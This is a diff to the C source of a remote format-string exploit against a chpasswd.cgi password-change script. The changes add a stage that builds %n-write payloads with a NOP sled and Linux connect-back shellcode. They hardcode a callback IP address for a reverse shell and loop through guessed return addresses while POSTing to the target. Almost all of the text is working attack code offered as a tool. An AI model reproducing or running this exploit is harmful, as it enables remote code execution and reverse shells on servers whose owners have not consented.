@@ -97,7 +97,7 @@ char lnx_connect_back[] =
 	"\xcd\x80"; 
 
 
-
+/* Log result */
 void
 log_result (char * fmt, ...)
 {
@@ -124,7 +124,7 @@ log_result (char * fmt, ...)
 	fclose (fp);
 }
 
-
+/* Print only printable characters */
 inline void
 print_result_as_ascii (char * result)
 {
@@ -147,6 +147,64 @@ print_result_as_ascii (char * result)
 	fflush (stdout);
 }
 
+/* Save all result stream bytes into result.raw  */
+inline void
+save_result_raw (char * result, int size)
+{
+	FILE * fp;
+	size_t n;
+
+	fp = fopen ("result.raw", "w+");
+	if (!fp)
+		return;
+	
+	n = fwrite (result, size, 1, fp);
+	
+	fclose (fp);
+}
+
+
+#define HTML_MSG13_BEGIN "<font color=red size=+2>"
+#define HTML_MSG13_END1  ":BEEF"
+#define HTML_MSG13_END2  ": BEEF"
+
+/* Calculate the length of msg13 */
+int
+calculate_msg13_length (char * result, int size)
+{
+	char * begin_msg13_ptr;
+	char * end_msg13_ptr;
+
+	/* Message format:
+	 *   <font color=red size=+2>\n
+	 *   <begin_msg13>: <end_msg13>BEEFAAAA
+	 */
+	begin_msg13_ptr = strstr (result, HTML_MSG13_BEGIN);
+	if (begin_msg13_ptr == NULL) {
+		return (-1);
+	}
+	
+	begin_msg13_ptr += strlen (HTML_MSG13_BEGIN);
+	begin_msg13_ptr++;	
+
+	end_msg13_ptr = strstr (begin_msg13_ptr, HTML_MSG13_END1);
+	if (end_msg13_ptr == NULL) {
+		end_msg13_ptr = strstr (begin_msg13_ptr, HTML_MSG13_END2);
+	}
+
+	if (end_msg13_ptr == NULL) {
+		return (-1);
+	}
+	
+	end_msg13_ptr = strstr (end_msg13_ptr, "BEEF");
+	if (begin_msg13_ptr == NULL) {
+		return (-1);
+	}
+
+	return (end_msg13_ptr - begin_msg13_ptr);
+}
+
+/* Verify the CGI script */
 int
 check_cgi (char * ip, int port, char * cgi_path)
 {
@@ -199,9 +257,141 @@ check_cgi (char * ip, int port, char * cgi_path)
 	return (0);
 }
 
+/* Create a string to be used to brute force the return address */
+int 
+brute_force_return_address (char *buffer, int maxlen, int align, int stack_height, unsigned int shellcode_addr, unsigned int return_addr, int msg13_length)
+{
+	int i;
+	char * ptr;
 
+	int fill_size;
+	int nop_length;
+
+	unsigned int lower_16bits;   /* 0x000000ff */
+	unsigned int higher_16bits;  /* 0x0000ff00 */
+	unsigned int lower_32bits;   /* 0x00ff0000 */
+	unsigned int higher_32bits;  /* 0xff000000 */
+	
+	int format_u_value[4];
+
+	int format_string_out_len;
+
+	char tmpbuffer[128];
+	
+	for (i = 0; i < 4; i++) {
+		format_u_value[i] = 12;
+	}
+
+
+	strncat (buffer, "user=", maxlen);
+
+	for (i = 0; i < align; i++) {
+		strncat (buffer, "S", maxlen);
+	}
+
+	ptr = &buffer[strlen (buffer)];
+
+	*(long *)ptr = 0x41414141;
+	ptr += 4;
+	*(long *)ptr = return_addr;
+	ptr += 4;
+	*(long *)ptr = 0x41414141;
+	ptr += 4;
+	*(long *)ptr = ++return_addr;
+	ptr += 4;
+	*(long *)ptr = 0x41414141;
+	ptr += 4;
+	*(long *)ptr = ++return_addr;
+	ptr += 4;
+	*(long *)ptr = 0x41414141;
+	ptr += 4;
+	*(long *)ptr = ++return_addr;
+	ptr += 4;
+
+	*ptr = '\0';
+
+	stack_height--;
+	for (i = 0; i < stack_height; i++) {
+		strncat (buffer, "%08x", maxlen);
+	}
+
+	
+	lower_16bits  = (shellcode_addr & 0x000000ff);
+	higher_16bits = (shellcode_addr & 0x0000ff00) >> 8;
+	lower_32bits  = (shellcode_addr & 0x00ff0000) >> 16;
+	higher_32bits = (shellcode_addr & 0xff000000) >> 24;
+
+	
+	format_string_out_len = msg13_length + align + (8 * 4) + (8 * stack_height) + 1 + 12;
+	
+
+	/* lower 16 bits */
+	if (format_string_out_len > lower_16bits) {
+		lower_16bits += 0x100;
+	}
+
+	format_u_value[0] += (lower_16bits - format_string_out_len);
+
+
+	/* higher 16 bits */
+	format_string_out_len = format_u_value[0];	
+	if (format_string_out_len > higher_16bits) {
+		higher_16bits += 0x100;
+	}
+
+	format_u_value[1] += (higher_16bits - format_string_out_len);
+
+
+	/* lower 32 bits */
+	format_string_out_len = format_u_value[1];	
+	if (format_string_out_len > lower_32bits) {
+		lower_32bits += 0x100;
+	}
+
+	format_u_value[2] += (lower_32bits - format_string_out_len);
+
+	/* higher 32 bits */
+	format_string_out_len = format_u_value[2];	
+	if (format_string_out_len > higher_32bits) {
+		higher_32bits += 0x100;
+	}
+
+	format_u_value[3] += (higher_32bits - format_string_out_len);	
+
+
+	snprintf (tmpbuffer, sizeof (tmpbuffer), "|%%%du%%n%%%du%%n%%%du%%n%%%du%%n|", format_u_value[0], format_u_value[1], format_u_value[2], format_u_value[3]);
+
+	strncat (buffer, tmpbuffer, maxlen);
+	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&", maxlen);
+
+	fill_size = 1022 - strlen (buffer);
+	nop_length = fill_size - strlen (lnx_connect_back);
+	
+	ptr = &buffer[strlen (buffer)];
+	memset (ptr, 0x90, nop_length);
+
+	ptr += nop_length;
+	memcpy (ptr, lnx_connect_back, strlen (lnx_connect_back));
+
+	ptr = strstr (buffer, "IPIP");
+	if (!ptr) {
+		/* XXX??? */
+		printf ("ERROR!!!!\n");
+		return (-1);
+	}
+	
+
+	*(long *) ptr = inet_addr ("65.19.178.5");
+
+	save_result_raw (buffer, strlen (buffer));
+	
+	return (strlen (buffer));
+}
+
+
+/* Create the string to be used to find where shellcode is stored */
 int
-find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long addr)
+find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, unsigned int addr)
 {
 	int fill_size;
 	char * ptr;
@@ -219,15 +409,6 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 	/* ADDR */
 	memcpy (ptr, &addr, sizeof (addr));
 	ptr[4] = '\0';
-
-	/* 
-	 * Filling with some bytes to simulate the 
-	 * final string in exploitation: 
-	 * <addr  >AAAA
-	 * <addr-1>AAAA
-	 * <addr-2>AAAA
-	 * <addr-3>AAAA|<eating stack..>|%n%xu%n%xu%n%xu%n|
-	 */
 
 	strncat (buffer, "BEEFADDRBEEFADDRBEEFADDR.", maxlen);
 
@@ -248,6 +429,7 @@ find_shellcode_addr (char *buffer, int maxlen, int align, int stack_height, long
 	return (fill_size);
 }
 
+/* Create a string to find the stack height and aligment */
 void
 find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
 {	
@@ -270,6 +452,7 @@ find_stack_distance (char *buffer, int maxlen, int align, int stack_height)
 	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha", maxlen);
 }
 
+/* Create a HTTP post string */
 int
 post_chpasswd_user (char *ip, int port, char * cgi_path, char * user, 
 		    char * outbuffer, int maxlen)
@@ -280,12 +463,12 @@ post_chpasswd_user (char *ip, int port, char * cgi_path, char * user,
   	int tot_out_len;
 
 	fd = net_tcp_nonblock_connect (ip, port, 60);
-	 if (fd < 0) {
-		 return (-1);
-	 }
+	if (fd < 0) {
+		return (-1);
+	}
 
-	 snprintf (tmp, sizeof (tmp), 
-		   "POST %s HTTP/1.0\r\n"
+	snprintf (tmp, sizeof (tmp), 
+		  "POST %s HTTP/1.0\r\n"
 		  "Host:%s\r\n"
 		  "Content-Length: %d\r\n"
 		  "\r\n"
@@ -330,6 +513,10 @@ main (int argc, char ** argv)
 
 	char buffer[8192];
 	char result[8192];
+	int result_size;
+
+	int msg13_length;
+
 	char * ptr;
 	char * endPtr;
 	
@@ -339,13 +526,18 @@ main (int argc, char ** argv)
 	int found;
 
 	unsigned int expect_shellcode_addr = 0xbfffffff;
+	unsigned int expect_return_addr = 0xbfffffff;
+
 	int step = -128;
 
 	int shellcode_addr_found;
 
 	int total_shellcode_addr_retries;
+	int total_return_addr_retries;
 
 	int shellcode_size;
+
+
 	
 	puts ("Proof of concept chpasswd.cgi remote format string exploit");
 	puts ("by skylazart/dm_ - BufferOverflow & xored");
@@ -390,29 +582,31 @@ main (int argc, char ** argv)
 		exit (1);
 	}
 
-	printf ("Host %s:%d/%s ok\n", host, port, cgi_path);
+	printf ("Host: %s port: %d CGI: %s OK!\n", host, port, cgi_path);
 
 
 	printf (">> Finding stack_height and alignment...\n");
+	printf ("ENTER TO CONTINUE...\n");
+	getchar ();
 
 
 	found = 0;
 	do {
-		sleep (1);
+		//sleep (1);
 
 		memset (buffer, 0, sizeof (buffer));
 		memset (result, 0, sizeof (result));
 
-		find_stack_distance (buffer, sizeof (buffer)-2, align, 
-				     stack_height);
+		find_stack_distance (buffer, sizeof (buffer)-1, align, stack_height);
 
-		post_chpasswd_user (host, port, cgi_path, 
-				    buffer, result, sizeof (result)-2);
-
+		result_size = post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1);
+		
 		
 
+
+		printf (">> Finding stack_height (%d), aligment (%d)\n", stack_height, align);
+
 		print_result_as_ascii (result);
-		printf (">> %s\n", host);
 
 		
 		ptr = strstr (result, "BEEFAAAA");
@@ -450,10 +644,20 @@ main (int argc, char ** argv)
 	} while (found == 0);
 		
 
-	if (found == 1) {
-		printf (">> Found Host = %s stack_height = %d align = %d\n", host, stack_height, align);
+	if (found == 0) {
+		printf (">> Exploit failed trying to find stack height...\n");
+		exit (1);
 	}
-       	
+
+
+	save_result_raw (result, result_size);
+	msg13_length = calculate_msg13_length (result, result_size);
+
+	printf (">> Found Host = %s stack_height = %d align = %d msg13_len = %d\n", host, stack_height, align, msg13_length);	
+	printf (">> Finding shellcode address...\n");
+
+	printf ("ENTER TO CONTINUE...\n");
+	getchar ();
 
 	if (strstr (result, "FreeBSD")) {
 		//XXX: find the correct value for FreeBSD
@@ -470,7 +674,9 @@ main (int argc, char ** argv)
 		    (expect_shellcode_addr & 0x00ff0000) >>16 == 0 ||
 		    (expect_shellcode_addr & 0x0000ff00) >> 8 == 0 ||
 		    (expect_shellcode_addr & 0x000000FF)      == 0) {
+
 			printf (">> Skipping address 0x%08x\n", expect_shellcode_addr);
+
 			expect_shellcode_addr += step;
 			continue;
 		}
@@ -479,13 +685,13 @@ main (int argc, char ** argv)
 		memset (result, 0, sizeof (result));
 
 
-		fprintf (stderr, "\r>> Trying 0x%08x, [%d] steps.", expect_shellcode_addr, ++total_shellcode_addr_retries);
+		printf (">> Finding shellcode address at 0x%08x. (%d)\n", expect_shellcode_addr, ++total_shellcode_addr_retries);
 		
-		shellcode_size = find_shellcode_addr (buffer, sizeof (buffer)-2, align, stack_height, expect_shellcode_addr);
+
+		shellcode_size = find_shellcode_addr (buffer, sizeof (buffer)-1, align, stack_height, expect_shellcode_addr);
 
 
-		post_chpasswd_user (host, port, cgi_path, 
-				    buffer, result, sizeof (result)-2);
+		post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1);
 
 
 		if (!strstr (result, "Internal Server Error")) {
@@ -509,17 +715,13 @@ main (int argc, char ** argv)
 
 					printf (">> &Shellcode found: %s shellcode address: 0x%08x. Finding first byte... (%d of %d)bytes\n", host, expect_shellcode_addr, (endPtr - ptr), shellcode_size);
 
-					//expect_shellcode_addr = expect_shellcode_addr + step;
-
-					expect_shellcode_addr -= (shellcode_size-20) - (endPtr - ptr);
-					sleep (1);
+					expect_shellcode_addr -= (shellcode_size) - (endPtr - ptr);
 					continue;
 				}
 				
-				printf (">> &Shellcode found: %s shellcode address: 0x%08x. \n", host, expect_shellcode_addr);
+				printf (">> &Shellcode found: %s shellcode address: 0x%08x, %d bytes.\n", host, expect_shellcode_addr, (endPtr - ptr));
 				
 				shellcode_addr_found ++;
-				sleep (1);
 
 				if (shellcode_addr_found == 2) {
 					break;
@@ -536,12 +738,52 @@ main (int argc, char ** argv)
 	
 	printf ("\n\n");
 	printf (">> Partial exploit result:\n");
-	printf (">> Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+	printf (">> Host address %s stack_height=%d align=%d shellcode address=0x%08x msg13_length=%d\n", host, stack_height, align, expect_shellcode_addr, msg13_length);
+	printf (">> Last step: brute force return address...\n");
 
 	log_result ("Host address %s stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
 
-	printf (">> Brute forcing remote return address into stack...\n");
 
-	
+	printf ("ENTER TO CONTINUE...\n");
+	getchar ();
+
+
+
+	step = -128;
+
+	total_return_addr_retries = 0;
+	//expect_return_addr = 0x0804ffff;
+
+	for (;;) {
+		if ((expect_return_addr & 0xff000000) >>24 == 0 ||
+		    (expect_return_addr & 0x00ff0000) >>16 == 0 ||
+		    (expect_return_addr & 0x0000ff00) >> 8 == 0 ||
+		    (expect_return_addr & 0x000000FF)      == 0) {
+
+			printf (">> Skipping address 0x%08x\n", expect_return_addr);
+
+			expect_return_addr += step;
+			continue;
+		}
+
+		memset (buffer, 0, sizeof (buffer));
+		memset (result, 0, sizeof (result));
+
+
+		printf (">> Trying return address at 0x%08x. (%d)\r", expect_return_addr, ++total_return_addr_retries);
+		
+		brute_force_return_address (buffer, sizeof (buffer)-1, align, stack_height, expect_shellcode_addr, expect_return_addr, msg13_length);
+		
+		if (post_chpasswd_user (host, port, cgi_path, buffer, result, sizeof (result)-1) == 0) {
+			continue;
+		}
+		
+		printf ("\n");
+		print_result_as_ascii (result);
+		printf ("\n");
+
+		expect_return_addr += step;
+	}
+
 	return (0);
 }
